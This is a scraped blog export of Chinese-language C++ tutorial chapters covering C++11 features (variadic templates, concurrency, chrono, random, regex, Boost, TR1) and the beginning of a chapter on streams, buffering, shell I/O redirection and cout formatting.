(没有 if constexpr): // if (sizeof...(Args) &gt; 0) &#123; // std::cout &lt;&lt; &quot;, &quot;; // &#125; // print_values(rest_args...); // 递归调用，最终会调用到 print_values() 版本&#125;int main() &#123; std::cout &lt;&lt; &quot;Printing values:\\n&quot;; print_values(1, &quot;hello&quot;, 3.14, &#x27;a&#x27;); // 输出: 1, hello, 3.14, a print_values(&quot;Single argument&quot;); // 输出: Single argument print_values(); // 输出: (空行) return 0;&#125; 调用过程分析 print_values(1, &quot;hello&quot;, 3.14, &#39;a&#39;): 调用 print_values&lt;int, const char*, double, char&gt;(1, &quot;hello&quot;, 3.14, &#39;a&#39;) first_arg = 1, rest_args... = {“hello”, 3.14, ‘a’} 输出 “1, “ 递归调用 print_values(&quot;hello&quot;, 3.14, &#39;a&#39;) 调用 print_values&lt;const char*, double, char&gt;(&quot;hello&quot;, 3.14, &#39;a&#39;) first_arg = “hello”, rest_args... = {3.14, ‘a’} 输出 “hello, “ 递归调用 print_values(3.14, &#39;a&#39;) 调用 print_values&lt;double, char&gt;(3.14, &#39;a&#39;) first_arg = 3.14, rest_args... = {‘a’} 输出 “3.14, “ 递归调用 print_values(&#39;a&#39;) 调用 print_values&lt;char&gt;(&#39;a&#39;) first_arg = ‘a’, rest_args... = {} (空包) 输出 “a” 递归调用 print_values() 调用 print_values() (基本情况) 输出 std::endl 递归结束 展开语法 rest_args...: 当在函数调用中对函数参数包使用 ... 时，它会将包中的每个元素展开，作为独立的参数传递给函数。 其他展开技巧 (C++11): 虽然递归是最常见的方式，但也可以使用其他技巧，例如利用初始化列表或数组的逗号运算符特性来展开，但这些技巧通常更复杂且可读性较差。 123456789101112131415161718#include &lt;iostream&gt;#include &lt;vector&gt;// 使用初始化列表展开 (技巧性较强)template&lt;typename... Args&gt;void print_values_trick(const Args&amp;... args) &#123; // 创建一个临时 int 数组，利用初始化列表和逗号运算符 // 对包中的每个参数执行 (std::cout &lt;&lt; arg &lt;&lt; &quot; &quot;, 0) // 结果是 &#123;0, 0, 0, ...&#125;，但副作用是打印了参数 int dummy[] = &#123;0, ( (std::cout &lt;&lt; args &lt;&lt; &quot; &quot;), 0 )... &#125;; // (void)dummy; // 避免未使用变量警告 (可选) std::cout &lt;&lt; std::endl;&#125;int main() &#123; print_values_trick(10, &quot;world&quot;, 0.5); // 输出: 10 world 0.5 return 0;&#125; 这种技巧利用了 C++11 中 ... 可以在表达式中展开参数包的特性 (pattern)...，其中 pattern 会对包中的每个元素应用一次。 可变参数模板是 C++ 元编程和泛型编程的强大工具，使得编写能够处理任意数量参数的类型安全函数（如自定义的 printf、make_tuple、emplace_back 等）成为可能。 18.7 C++11新增的其他功能除了前面章节已经详细讨论或回顾的主要特性（如 auto, nullptr, 统一初始化, 移动语义, Lambda, 智能指针, 范围 for, 新类功能, 可变参数模板等）之外，C++11 标准还引入了许多其他重要的功能和库，进一步增强了语言的能力。本节将简要介绍其中的一些。 18.7.1 并行编程C++11 首次在标准库层面提供了对多线程并发编程的支持，主要定义在 &lt;thread&gt;, &lt;mutex&gt;, &lt;condition_variable&gt;, &lt;future&gt;, &lt;atomic&gt; 等头文件中。 std::thread: 用于创建和管理线程。允许函数或可调用对象在独立的线程中执行。 12345678910111213#include &lt;thread&gt;#include &lt;iostream&gt;void worker_thread() &#123; std::cout &lt;&lt; &quot;Worker thread running.\\n&quot;;&#125;int main() &#123; std::thread t(worker_thread); // 创建新线程并执行 worker_thread std::cout &lt;&lt; &quot;Main thread running.\\n&quot;; t.join(); // 等待 worker_thread 执行完毕 return 0;&#125; 互斥量 (std::mutex, std::lock_guard, std::unique_lock): 用于保护共享数据，防止多个线程同时访问导致的数据竞争。lock_guard 和 unique_lock 提供了 RAII 风格的锁管理，确保互斥量能被正确释放。 1234567891011#include &lt;mutex&gt;#include &lt;vector&gt;#include &lt;thread&gt;std::mutex data_mutex;std::vector&lt;int&gt; shared_data;void add_data(int val) &#123; std::lock_guard&lt;std::mutex&gt; lock(data_mutex); // 自动加锁，离开作用域时自动解锁 shared_data.push_back(val);&#125; 条件变量 (std::condition_variable): 用于线程间的同步，允许一个线程等待某个条件变为真（由另一个线程通知）。通常与 std::mutex 和 std::unique_lock 配合使用。 原子操作 (std::atomic&lt;T&gt;): 提供对基本类型的原子操作（如读取、写入、增减、比较交换），保证这些操作在多线程环境下不会被打断，避免了数据竞争，通常比使用互斥量更高效。 123#include &lt;atomic&gt;std::atomic&lt;int&gt; counter = 0;// counter++; // 原子地自增 异步操作 (std::async, std::future, std::promise): 提供了一种更高级的并发模型，允许异步地执行任务并获取其结果。std::async 可以启动一个异步任务，返回一个 std::future 对象，通过 future 可以在稍后获取任务的返回值或等待任务完成。promise 则用于在一个线程中设置值或异常，供另一个线程通过关联的 future 获取。 C++11 的并发支持使得编写可移植的多线程程序成为可能。 18.7.2 新增的库C++11 标准库增加了几个实用的新组件： &lt;chrono&gt;: 提供了处理时间和时间段的类型安全、精确的库。包括时钟 (system_clock, steady_clock, high_resolution_clock)、时间点 (time_point) 和时间段 (duration)。 12345678910111213#include &lt;chrono&gt;#include &lt;iostream&gt;#include &lt;thread&gt; // for sleep_forint main() &#123; auto start = std::chrono::high_resolution_clock::now(); std::this_thread::sleep_for(std::chrono::milliseconds(50)); // 休眠 50 毫秒 auto end = std::chrono::high_resolution_clock::now(); std::chrono::duration&lt;double, std::milli&gt; elapsed = end - start; // 计算毫秒差 std::cout &lt;&lt; &quot;Elapsed time: &quot; &lt;&lt; elapsed.count() &lt;&lt; &quot; ms\\n&quot;; return 0;&#125; &lt;random&gt;: 提供了比 C 风格 rand() 更强大、更灵活的随机数生成工具。包括多种随机数引擎（如 mt19937）和分布（如 uniform_int_distribution, normal_distribution）。 1234567891011#include &lt;random&gt;#include &lt;iostream&gt;int main() &#123; std::random_device rd; // 用于生成种子 (可能基于硬件) std::mt19937 gen(rd()); // Mersenne Twister 引擎 std::uniform_int_distribution&lt;&gt; distrib(1, 6); // 均匀分布 [1, 6] std::cout &lt;&lt; &quot;Rolling a die: &quot; &lt;&lt; distrib(gen) &lt;&lt; std::endl; // 生成随机数 return 0;&#125; &lt;regex&gt;: 提供了对正则表达式 (Regular Expressions) 的支持，用于强大的文本模式匹配和搜索/替换。 1234567891011121314#include &lt;regex&gt;#include &lt;string&gt;#include &lt;iostream&gt;int main() &#123; std::string text = &quot;Email: example@test.com&quot;; std::regex email_regex(R&quot;(\\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]&#123;2,&#125;\\b)&quot;); // 原始字符串字面量 std::smatch match; if (std::regex_search(text, match, email_regex)) &#123; std::cout &lt;&lt; &quot;Found email: &quot; &lt;&lt; match.str(0) &lt;&lt; std::endl; &#125; return 0;&#125; &lt;tuple&gt;: 提供了元组 (Tuple) 类型 std::tuple，可以看作是匿名的、固定大小的异构值集合，类似于 std::pair 的泛化。 1234567891011#include &lt;tuple&gt;#include &lt;string&gt;#include &lt;iostream&gt;int main() &#123; std::tuple&lt;int, std::string, double&gt; t1(10, &quot;hello&quot;, 3.14); std::cout &lt;&lt; &quot;Tuple element 0: &quot; &lt;&lt; std::get&lt;0&gt;(t1) &lt;&lt; std::endl; // 使用 std::get&lt;i&gt; 访问 std::cout &lt;&lt; &quot;Tuple element 1: &quot; &lt;&lt; std::get&lt;1&gt;(t1) &lt;&lt; std::endl; // C++17 结构化绑定更方便: auto [id, name, value] = t1; return 0;&#125; 18.7.3 低级编程C++11 也增强了对底层内存布局和编译时计算的支持： 对齐控制 (alignas, alignof): alignas: 用于指定变量或类型的内存对齐要求。 alignof: 用于查询类型或对象的对齐要求（返回一个 size_t）。1234567891011#include &lt;iostream&gt;struct alignas(16) AlignedStruct &#123; // 要求按 16 字节对齐 char data[32];&#125;;int main() &#123; std::cout &lt;&lt; &quot;Alignment of int: &quot; &lt;&lt; alignof(int) &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Alignment of AlignedStruct: &quot; &lt;&lt; alignof(AlignedStruct) &lt;&lt; std::endl; // 输出 16 return 0;&#125; constexpr: 用于声明函数或变量可以在编译时求值。constexpr 函数可以在编译时用于常量表达式，也可以在运行时像普通函数一样使用。constexpr 变量必须用常量表达式初始化。这使得更多的计算可以在编译阶段完成，提高了运行时性能并增强了元编程能力。 12345678910111213141516#include &lt;array&gt;// constexpr 函数，可在编译时计算constexpr int factorial(int n) &#123; return (n &lt;= 1) ? 1 : (n * factorial(n - 1));&#125;int main() &#123; constexpr int five_factorial = factorial(5); // 编译时计算结果为 120 std::array&lt;int, factorial(4)&gt; arr; // 数组大小在编译时确定为 24 int runtime_val = 6; int six_factorial = factorial(runtime_val); // 运行时计算 return 0;&#125; 18.7.4 杂项 用户定义字面量 (User-defined Literals): 允许程序员为字面量（如 &quot;hello&quot;, 123, 3.14）定义后缀，从而创建具有特定类型或意义的对象。后缀通常以下划线 _ 开头。 12345678910111213#include &lt;chrono&gt;#include &lt;iostream&gt;// 定义一个将秒转换为毫秒的用户定义字面量后缀 _msconstexpr std::chrono::milliseconds operator&quot;&quot; _ms(unsigned long long ms) &#123; return std::chrono::milliseconds(ms);&#125;int main() &#123; auto duration = 150_ms; // duration 的类型是 std::chrono::milliseconds，值为 150ms std::cout &lt;&lt; &quot;Duration: &quot; &lt;&lt; duration.count() &lt;&lt; &quot;ms\\n&quot;; return 0;&#125; 原始字符串字面量 (Raw String Literals): 用于简化包含大量特殊字符（如反斜杠 \\、引号 &quot;）的字符串的定义，避免了繁琐的转义。 语法：R&quot;delimiter(raw_characters)delimiter&quot; delimiter 是可选的分隔符序列（不能包含括号、反斜杠或空格），用于区分字符串内容和结束标记。1234567891011121314151617#include &lt;string&gt;#include &lt;iostream&gt;int main() &#123; // 无需转义反斜杠和引号 std::string path = R&quot;(C:\\Program Files\\My App\\data.txt)&quot;; std::string html = R&quot;delimiter(&lt;html&gt; &lt;head&gt;&lt;title&gt;&quot;Example&quot;&lt;/title&gt;&lt;/head&gt; &lt;body&gt;Hello, world!&lt;/body&gt;&lt;/html&gt;)delimiter&quot;; std::cout &lt;&lt; path &lt;&lt; std::endl; std::cout &lt;&lt; html &lt;&lt; std::endl; return 0;&#125; 这些只是 C++11 新增功能的一部分，它们共同构成了现代 C++ 的基础，使得 C++ 成为一门功能更强大、表达力更强、更易于使用的编程语言。 18.8 语言变化C++ 是一门不断发展的语言。从 C++98/03 到 C++11，再到后续的 C++14, C++17, C++20 等标准，语言本身和标准库都在持续演进，以满足现代软件开发的需求。C++11 是一个里程碑式的版本，引入了大量重要特性，其中许多特性并非凭空出现，而是在标准化之前经过了社区的广泛讨论和实践检验。Boost 库和 TR1 在这一过程中扮演了重要角色。 18.8.1 Boost 项目Boost C++ 库 (Boost C++ Libraries) 是一个广受推崇的、高质量的、经过同行评审的 C++ 库集合。它由 C++ 社区的众多开发者共同维护和贡献。 目的: Boost 旨在提供各种通用和特定领域的库，扩展 C++ 标准库的功能。它既包含可以直接使用的工具（如日期时间处理、文件系统操作、正则表达式、测试框架等），也包含一些实验性的、可能在未来被纳入 C++ 标准的库。 影响力: Boost 对 C++ 标准的发展产生了深远影响。许多 C++11 及后续标准中的新特性（如智能指针 shared_ptr、函数包装器 function、线程库、正则表达式库、元组 tuple、array 等）都起源于 Boost 库中的对应组件，并在 Boost 中得到了广泛的应用和验证。 “试炼场”: Boost 常常被视为 C++ 新特性的“试炼场”。一个库如果在 Boost 中被证明是稳定、有用且设计良好的，那么它被 C++ 标准委员会考虑并最终纳入官方标准的可能性就会大大增加。 许可证: Boost 库通常采用非常宽松的 Boost Software License，允许在商业和非商业项目中自由使用。 即使某些功能已被纳入 C++ 标准库，Boost 仍然提供了标准库中尚未包含的许多有用工具，并且有时会提供比标准库版本更早或功能更丰富的实现。 18.8.2 TR1 (Technical Report 1)**TR1 (Technical Report 1)**，正式名称是 ISO/IEC TR 19768:2007，是 C++ 标准委员会发布的一份技术报告，旨在扩展 C++03 标准库。它并不是 C++ 标准本身的一部分，但它定义了一系列推荐添加的库组件。 内容: TR1 包含了许多后来被正式纳入 C++11 标准库的特性，其中大部分源自 Boost 库。主要内容包括： 引用包装器 (ref, cref) 智能指针 (shared_ptr, weak_ptr - unique_ptr 是 C++11 新设计的) 函数对象包装器 (function) 函数对象绑定器 (bind) 类型萃取 (&lt;type_traits&gt;) 随机数生成 (&lt;random&gt;) 元组 (&lt;tuple&gt;) 固定大小数组 (&lt;array&gt;) 哈希表容器 (&lt;unordered_set&gt;, &lt;unordered_map&gt;) 正则表达式 (&lt;regex&gt;) 命名空间: TR1 中的组件通常被放置在 std::tr1 命名空间下。例如，TR1 的智能指针是 std::tr1::shared_ptr。 过渡角色: TR1 起到了一个重要的过渡作用。它允许编译器厂商和库开发者在 C++11 标准正式发布之前，就开始实现和提供这些即将标准化的重要库功能，让用户可以提前体验和使用。当 C++11 标准发布后，这些组件被正式移入了 std 命名空间，std::tr1 命名空间则逐渐被废弃。 了解 Boost 和 TR1 有助于理解 C++11 中许多库特性的来源和演变过程。它们展示了 C++ 社区驱动语言发展的模式：通过第三方库（如 Boost）进行探索和实践，通过技术报告（如 TR1）进行预标准化，最终将成熟的特性纳入官方标准。 18.8.3 使用 Boost虽然许多 Boost 库的功能已被 C++11 及后续标准吸收，但 Boost 仍然是一个非常有价值的资源库。 如何使用 Boost (概念性步骤): 下载: 从 Boost 官方网站 (boost.org) 下载最新的 Boost 发行版。 解压: 将下载的压缩包解压到你选择的目录。 编译 (部分库需要): Boost 中的许多库是仅头文件 (Header-only) 的，这意味着你只需要在你的代码中 #include 相应的头文件，并将 Boost 的根目录添加到编译器的包含路径 (Include Path) 中即可使用。然而，也有一些库（如 Boost.Thread, Boost.Filesystem, Boost.Regex, Boost.Program_options 等）需要编译成静态库或动态库文件。 编译通常需要运行 Boost 提供的 bootstrap 脚本（根据你的操作系统选择 .bat 或 .sh），然后运行生成的 b2 (或 bjam) 构建工具。你需要指定你的编译器、构建类型（debug/release）、链接方式（static/shared）等。具体步骤请参考 Boost 官方文档。 配置项目: 包含路径: 在你的项目设置中，将 Boost 库的根目录添加到编译器的头文件搜索路径。 库路径 (如果编译了库): 将生成的库文件所在的目录添加到链接器的库文件搜索路径。 链接库 (如果编译了库): 将你需要使用的 Boost 库文件（如 libboost_thread-vc142-mt-gd-x64-1_79.lib 等，文件名会根据版本、编译器、配置等变化）添加到链接器的输入中。 包含头文件: 在你的 C++ 代码中使用 #include &lt;boost/xxx.hpp&gt; 来包含所需的 Boost 头文件。 示例 (使用 Boost.Lexical_Cast):Boost.Lexical_Cast 是一个仅头文件的库，用于字符串和数值之间的转换。 12345678910111213141516171819202122// 假设 Boost 根目录已添加到包含路径#include &lt;boost/lexical_cast.hpp&gt;#include &lt;string&gt;#include &lt;iostream&gt;int main() &#123; try &#123; std::string s = &quot;12345&quot;; int i = boost::lexical_cast&lt;int&gt;(s); std::cout &lt;&lt; &quot;String &#x27;&quot; &lt;&lt; s &lt;&lt; &quot;&#x27; cast to int: &quot; &lt;&lt; i &lt;&lt; std::endl; double d = 3.14159; std::string sd = boost::lexical_cast&lt;std::string&gt;(d); std::cout &lt;&lt; &quot;Double &quot; &lt;&lt; d &lt;&lt; &quot; cast to string: &#x27;&quot; &lt;&lt; sd &lt;&lt; &quot;&#x27;&quot; &lt;&lt; std::endl; std::string bad_s = &quot;hello&quot;; int bad_i = boost::lexical_cast&lt;int&gt;(bad_s); // 会抛出 boost::bad_lexical_cast 异常 &#125; catch (const boost::bad_lexical_cast&amp; e) &#123; std::cerr &lt;&lt; &quot;Lexical cast error: &quot; &lt;&lt; e.what() &lt;&lt; std::endl; &#125; return 0;&#125; 使用 Boost 库可以极大地扩展 C++ 的能力，但需要注意正确配置编译和链接环境。建议详细阅读你所使用的具体 Boost 库的文档。 18.9 总结本章深入探讨了 C++11 标准引入的一系列重要特性，这些特性极大地改变了 C++ 的编程方式，使其更高效、更安全、更易用。 主要内容回顾： C++11 特性回顾: 复习了之前章节已介绍的 C++11 功能，包括新类型 (long long, char16_t, char32_t, nullptr)、统一初始化 (&#123;&#125;), 声明 (auto, decltype)、智能指针 (unique_ptr, shared_ptr, weak_ptr)、异常规范 (noexcept)、作用域内枚举 (enum class) 以及对类、模板和 STL 的改进（如范围 for、array、无序容器、initializer_list、模板别名 using）。 移动语义和右值引用: 右值引用 (&amp;&amp;): 引入用于区分即将销毁的临时对象（右值）和持久对象（左值）。 移动语义: 允许从右值或标记为可移动的对象那里“窃取”资源（如动态内存指针），而不是进行昂贵的复制。 移动构造函数和移动赋值运算符: 特殊成员函数，接收右值引用参数，实现资源转移并将源对象置于有效的空状态。应标记为 noexcept。 std::move: 将一个左值强制转换为右值引用类型，以触发移动语义（但本身不执行移动）。使用后不应对源对象的值做假设。 新的类功能: 特殊成员函数控制 (= default, = delete): 显式要求编译器生成默认实现或禁用特定成员函数（特别是复制/移动操作）。 委托构造函数: 允许一个构造函数调用同一类的另一个构造函数，减少代码重复。 继承构造函数 (using Base::Base;): 允许派生类继承基类的构造函数，简化派生类编写。 虚函数管理 (override, final): override 确保派生类方法正确覆盖基类虚函数；final 阻止虚函数被进一步覆盖或类被继承。 Lambda 函数: 提供简洁的语法，用于在需要可调用对象的地方就地定义匿名函数对象。 [capture](params) -&gt; ret &#123;body&#125;: 包含捕获子句、参数列表（可选）、返回类型（可选）和函数体。 捕获: 可以通过值 (=, var) 或引用 (&amp;, &amp;var) 捕获外部作用域的变量。mutable 关键字允许修改值捕获变量的副本。 常用于 STL 算法，提高代码的局部性和可读性。 包装器 (std::function): 定义在 &lt;functional&gt; 中的通用函数包装器。 可以存储、复制和调用任何具有兼容签名的可调用实体（函数指针、Lambda、函数对象、成员函数等）。 通过类型擦除实现，提供了灵活性，但在性能敏感场景下可能有开销（堆分配、间接调用）。 替代方案包括模板（编译时已知类型时更高效）、函数指针、直接传递 Lambda。 可变参数模板: 允许函数模板和类模板接受任意数量、任意类型的模板参数（模板参数包 typename... Args）和函数参数（函数参数包 Args... args）。 使用 sizeof...(Args) 获取参数数量。 通常需要通过递归或 C++17 的折叠表达式来展开参数包，以处理每个参数。 C++11 新增的其他功能: 并发编程: 标准库支持 (&lt;thread&gt;, &lt;mutex&gt;, &lt;atomic&gt;, &lt;future&gt; 等）。 新库: &lt;chrono&gt; (时间), &lt;random&gt; (随机数), &lt;regex&gt; (正则表达式), &lt;tuple&gt; (元组)。 低级编程: 对齐控制 (alignas, alignof), 编译时计算 (constexpr)。 杂项: 用户定义字面量, 原始字符串字面量 (R&quot;(...)&quot;)。 语言变化: 强调了 C++ 语言的持续演进。 介绍了 Boost 库作为 C++ 新特性的试验场和重要补充。 介绍了 TR1 作为 C++11 库特性的前身和过渡。 C++11 是 C++ 发展的一个重要分水岭，它引入的这些特性深刻地影响了现代 C++ 的编程风格和实践。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 17 输入、输出和文件","slug":"Cpp_tutorial_Chapter_17","date":"2025-04-30T15:42:24.026Z","updated":"2025-04-30T15:40:48.053Z","comments":true,"path":"2025/04/30/Cpp_tutorial_Chapter_17/","link":"","permalink":"http://uniqueland.top/2025/04/30/Cpp_tutorial_Chapter_17/","excerpt":"","text":"17.1 C++输入和输出概述C++ 程序经常需要与外部世界进行交互：从键盘读取用户输入，将结果显示到屏幕，或者读写文件。C++ 使用流 (Stream) 的概念来处理输入和输出 (I/O) 操作。 17.1.1 流和缓冲区流 (Stream) 是一个抽象的概念，它表示一个字节序列，这些字节可以从某个源（如键盘、文件、网络连接）流向程序（输入流），或者从程序流向某个目的地（如屏幕、文件、网络连接）（输出流）。将 I/O 操作视为字节流可以提供一个统一的接口来处理各种不同的 I/O 设备。 缓冲区 (Buffer) 是一块内存区域，用于临时存储数据。I/O 操作通常涉及物理设备（如硬盘、屏幕），这些设备的速度往往比 CPU 和内存慢得多。为了提高效率，数据通常不会在程序和设备之间逐个字节地传输，而是先暂存在缓冲区中： 输出: 当程序执行输出操作时（例如使用 cout &lt;&lt;），数据通常先被发送到输出缓冲区。当缓冲区满了、遇到换行符（对于行缓冲的流）、程序结束或显式刷新缓冲区时，缓冲区中的内容才会被一次性地传输到最终的输出设备。 输入: 当程序请求输入时（例如使用 cin &gt;&gt;），系统可能会一次性从输入设备读取比程序请求的更多的数据，并将其存储在输入缓冲区中。程序随后从缓冲区中获取所需的数据。如果缓冲区为空，程序会等待输入设备提供数据。 使用缓冲区的好处: 提高效率: 减少了与慢速 I/O 设备的直接交互次数。 平滑数据流: 允许程序和设备以各自的速度工作。 缓冲区的类型: 完全缓冲 (Fully Buffered): 只有当缓冲区满了，或者显式刷新时，才会进行实际的 I/O 操作（通常用于文件 I/O）。 行缓冲 (Line Buffered): 除了缓冲区满或显式刷新外，遇到换行符 (\\n) 时也会进行 I/O 操作（通常用于标准输出 cout，当它连接到终端时）。 无缓冲 (Unbuffered): 数据尽快进行实际的 I/O 操作（通常用于标准错误输出 cerr，以确保错误信息能立即显示）。 17.1.2 流、缓冲区和 iostream 文件C++ 的 I/O 功能主要定义在 &lt;iostream&gt; 头文件中（以及其他相关头文件如 &lt;fstream&gt;, &lt;sstream&gt;）。&lt;iostream&gt; 定义了一系列用于处理流的类和对象。 核心 I/O 类库: ios_base: 提供了与流无关的基本属性和方法（如格式化标志、流状态）。 ios: 基于 ios_base，增加了与具体字符类型相关的错误状态信息。 ostream: 基于 ios，提供了输出流的功能（如 operator&lt;&lt;, put(), write()）。 istream: 基于 ios，提供了输入流的功能（如 operator&gt;&gt;, get(), getline(), read()）。 iostream: 同时继承自 istream 和 ostream，支持输入和输出操作。 标准流对象: &lt;iostream&gt; 还定义了几个预定义的全局流对象，用于处理标准输入和输出： cin (console input): istream 类的对象，通常连接到标准输入设备（键盘）。 cout (console output): ostream 类的对象，通常连接到标准输出设备（屏幕）。它通常是行缓冲的。 cerr (console error): ostream 类的对象，通常连接到标准错误设备（屏幕）。它通常是无缓冲的，用于立即显示错误消息。 clog (console log): ostream 类的对象，也通常连接到标准错误设备。但它通常是缓冲的。 1234567891011121314151617#include &lt;iostream&gt; // 包含 iostream 以使用 cin, cout, cerr, clogint main() &#123; int age; std::cout &lt;&lt; &quot;Enter your age: &quot;; // 使用 cout 输出提示信息到标准输出 std::cin &gt;&gt; age; // 使用 cin 从标准输入读取整数 if (age &lt; 0) &#123; std::cerr &lt;&lt; &quot;Error: Age cannot be negative.&quot; &lt;&lt; std::endl; // 使用 cerr 输出错误信息到标准错误 std::clog &lt;&lt; &quot;Log: Invalid age entered.&quot; &lt;&lt; std::endl; // 使用 clog 输出日志信息 return 1; &#125; std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; age &lt;&lt; std::endl; // 输出结果到标准输出 return 0;&#125; 这些标准流对象使得基本的控制台 I/O 非常方便。 17.1.3 重定向许多操作系统（如 Linux, macOS, Windows）支持I/O 重定向 (Redirection)**。重定向允许你改变程序的标准输入来源和标准输出/标准错误的目的地，而无需修改程序代码**。 输出重定向 (&gt;): 将程序的标准输出（cout 的内容）发送到指定文件，而不是屏幕。如果文件已存在，通常会覆盖它。 1./my_program &gt; output.txt 执行 my_program，其 cout 输出的内容将写入 output.txt 文件。 输出重定向（追加 &gt;&gt;): 将程序的标准输出追加到指定文件的末尾。如果文件不存在，则创建它。 1./my_program &gt;&gt; output.txt 输入重定向 (&lt;): 使程序从指定文件读取其标准输入（cin 的内容），而不是从键盘。 1./my_program &lt; input.txt my_program 会从 input.txt 文件中读取它期望通过 cin 获得的数据。 错误重定向: 重定向标准错误 (cerr, clog) 的方式因 shell 而异。 bash/sh/zsh: 使用 2&gt; (覆盖) 或 2&gt;&gt; (追加)。 123./my_program 2&gt; error.log # 重定向 stderr 到 error.log./my_program &gt; output.txt 2&gt; error.log # 重定向 stdout 和 stderr./my_program &gt; combined.log 2&gt;&amp;1 # 将 stderr 重定向到 stdout，然后一起重定向到文件 Windows (cmd.exe): 类似地使用 2&gt; 和 2&gt;&gt;。 重定向是一个强大的工具，它允许我们将程序的输入和输出与文件连接起来，方便进行测试、日志记录和数据处理，而无需修改程序本身来处理文件 I/O。程序仍然使用 cin, cout, cerr，但操作系统负责将这些标准流连接到文件。 17.2 使用 cout 进行输出std::cout 是 C++ 标准库 &lt;iostream&gt; 中预定义的一个 ostream 类的全局对象，通常连接到标准输出设备（如屏幕）。它是 C++ 中最常用的输出工具。 17.2.1 重载的 &lt;&lt; 运算符cout 最常见的用法是配合插入运算符 (&lt;&lt;) 使用。这个运算符被重载 (overloaded) 以接受 C++ 中所有的基本数据类型（如 int, float, double, char, 指针类型）以及一些库类型（如 std::string, C 风格字符串 const char*）。 工作原理: cout &lt;&lt; value; 表达式的值是 cout 对象本身 (ostream&amp;)。 这使得可以链接 (chain) 多个插入运算符：cout &lt;&lt; &quot;Value: &quot; &lt;&lt; x &lt;&lt; &quot; and &quot; &lt;&lt; y;。这会被解释为 ((cout &lt;&lt; &quot;Value: &quot;) &lt;&lt; x) &lt;&lt; &quot; and &quot;) &lt;&lt; y;。 &lt;&lt; 运算符会根据 value 的类型，将其转换为适当的字符表示形式，并发送到输出流（通常先到缓冲区）。 示例: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; int age = 30; double weight = 65.5; char initial = &#x27;J&#x27;; const char* name = &quot;John Doe&quot;; std::string city = &quot;New York&quot;; std::cout &lt;&lt; &quot;--- Basic Output ---&quot; &lt;&lt; std::endl; // endl 插入换行符并刷新缓冲区 std::cout &lt;&lt; &quot;Name: &quot; &lt;&lt; name &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Initial: &quot; &lt;&lt; initial &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Weight: &quot; &lt;&lt; weight &lt;&lt; &quot; kg&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;City: &quot; &lt;&lt; city &lt;&lt; std::endl; // 链接输出 std::cout &lt;&lt; &quot;\\n--- Chained Output ---&quot; &lt;&lt; std::endl; std::cout &lt;&lt; name &lt;&lt; &quot; (&quot; &lt;&lt; initial &lt;&lt; &quot;), age &quot; &lt;&lt; age &lt;&lt; &quot;, lives in &quot; &lt;&lt; city &lt;&lt; &quot;.&quot; &lt;&lt; std::endl; // 输出指针地址 (通常以十六进制显示) int* ptr_age = &amp;age; std::cout &lt;&lt; &quot;\\nAddress of age: &quot; &lt;&lt; ptr_age &lt;&lt; std::endl; return 0;&#125; 对于用户自定义的类类型，如果想让 cout &lt;&lt; myObject; 能够工作，需要为该类重载 operator&lt;&lt;（通常作为友元函数），如第 11 章所述。 17.2.2 其他 ostream 方法除了 &lt;&lt; 运算符，ostream 类（cout 是其对象）还提供了其他输出方法： put(char c): 输出单个字符 c。 123std::cout.put(&#x27;H&#x27;);std::cout.put(&#x27;i&#x27;);std::cout.put(&#x27;!&#x27;).put(&#x27;\\n&#x27;); // put() 也返回 ostream&amp;，可以链接 write(const char* s, streamsize n): 输出从地址 s 开始的内存块中的 n 个字节。它不会在遇到空字符 \\0 时停止，而是精确地写入 n 个字节。这对于输出二进制数据或非空字符结尾的字符数组很有用。 1234567const char* message = &quot;Binary Data&quot;;// 输出前 6 个字节 &quot;Binary&quot;std::cout.write(message, 6) &lt;&lt; std::endl;char buffer[] = &#123;&#x27;A&#x27;, &#x27;B&#x27;, &#x27;\\0&#x27;, &#x27;C&#x27;, &#x27;D&#x27;&#125;;// 输出整个 buffer 的 5 个字节，包括空字符std::cout.write(buffer, sizeof(buffer)) &lt;&lt; std::endl; 17.2.3 刷新输出缓冲区如前所述，输出通常是缓冲的。有时我们需要确保缓冲区中的内容立即被发送到输出设备，这称为刷新 (Flushing) 缓冲区。 有几种方法可以刷新 cout 的缓冲区： std::endl (Manipulator): 这是最常用的方法。endl 不仅向流中插入一个换行符 (\\n)**，还会显式刷新**输出缓冲区。 1std::cout &lt;&lt; &quot;Line 1&quot; &lt;&lt; std::endl; // 输出 &quot;Line 1&quot;，换行，并刷新 std::flush (Manipulator): 只刷新输出缓冲区，不插入任何字符。 123std::cout &lt;&lt; &quot;Processing...&quot; &lt;&lt; std::flush; // 立即显示 &quot;Processing...&quot;，不换行// ...长时间操作...std::cout &lt;&lt; &quot; Done.&quot; &lt;&lt; std::endl; std::ends (Manipulator): 向流中插入一个空字符 (\\0)**，然后刷新**缓冲区。这在与其他需要空字符结尾字符串的系统交互时可能有用，但不太常见。 1std::cout &lt;&lt; &quot;Null terminated&quot; &lt;&lt; std::ends; 程序正常结束: 当 main 函数返回或调用 exit() 时，通常会自动刷新所有打开的输出流。 缓冲区满: 当缓冲区满时会自动刷新。 与输入关联: 当 cin 需要从用户那里读取数据，并且 cout 的缓冲区中有待输出的内容时，通常会先刷新 cout 的缓冲区（以确保提示信息先显示出来）。 endl vs. &#39;\\n&#39;: cout &lt;&lt; endl; 等价于 cout &lt;&lt; &#39;\\n&#39; &lt;&lt; flush; cout &lt;&lt; &#39;\\n&#39;; 只插入换行符，不保证立即刷新缓冲区（除非流是行缓冲且连接到终端）。 在性能敏感的代码中（例如大量循环输出），频繁使用 endl 可能会因为不必要的刷新而降低效率。在这种情况下，如果不需要每次都立即看到输出，可以只使用 &#39;\\n&#39;，让缓冲区在更合适的时机（如缓冲区满或程序结束）刷新。 17.2.4 用 cout 进行格式化默认情况下，cout 会根据数据的类型选择一种“合理”的格式进行输出。但我们可以通过多种方式控制输出的格式，例如字段宽度、小数位数、对齐方式、数字基数等。 格式化可以通过以下方式设置： ios_base 成员函数: ios_base 类（ostream 